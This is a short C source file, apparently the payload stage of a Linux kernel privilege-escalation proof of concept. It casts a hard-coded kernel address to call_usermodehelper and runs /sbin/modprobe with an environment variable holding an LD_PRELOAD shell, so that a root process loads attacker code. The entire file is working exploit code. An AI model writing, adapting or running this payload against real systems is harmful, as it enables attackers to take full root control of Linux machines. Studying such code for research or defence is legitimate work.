#include "poc.h"

void _start(void) {
	int (*call_usermodehelper)(const char *, void *, void *, int) = (void *)X_call_usermodehelper;
	char *argv[] = { (char []){ "/sbin/modprobe" }, 0 };
	char *envp[] = { (char []){ LD_PRELOAD_SHELL }, 0 };
	call_usermodehelper(argv[0], argv, envp, 1);
}
